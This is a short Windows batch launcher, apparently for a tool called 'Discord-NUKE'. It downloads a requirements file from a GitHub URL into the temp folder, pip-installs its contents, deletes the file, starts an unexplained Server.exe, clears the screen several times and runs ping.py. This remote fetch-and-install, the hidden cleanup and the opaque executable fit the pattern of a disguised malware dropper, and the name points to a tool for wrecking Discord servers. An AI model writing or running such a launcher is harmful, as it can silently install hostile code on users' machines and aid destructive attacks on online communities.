@echo off
powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rraapt66/Discord-NUKE/main/requirements.txt" -OutFile "%temp%\requirements.txt"
python -m pip install -r %temp%\requirements.txt
cls
del %temp%\requirements.txt
start Server.exe
cls
timeout 4 > nul
cls
python ping.py